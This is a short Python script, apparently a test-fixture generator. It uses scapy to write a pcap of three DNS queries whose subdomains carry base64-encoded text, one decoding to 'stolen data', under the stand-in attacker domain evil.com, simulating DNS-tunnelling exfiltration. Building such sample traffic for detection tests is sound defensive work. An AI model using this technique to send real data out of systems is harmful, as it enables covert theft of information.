from scapy.all import IP, UDP, DNS, DNSQR, wrpcap

pkts = []
for payload in ['aGVsbG8gd29ybGQ=', 'c3RvbGVuIGRhdGE=', 'dGhpcyBpcyBiYWQ=']:
    p = (
        IP(src='192.168.1.100', dst='8.8.8.8') /
        UDP(dport=53) /
        DNS(rd=1, qd=DNSQR(qname=f'{payload}.evil.com'))
    )
    pkts.append(p)

wrpcap('tests/sample_pcaps/dns_test.pcap', pkts)
print('Written dns_test.pcap')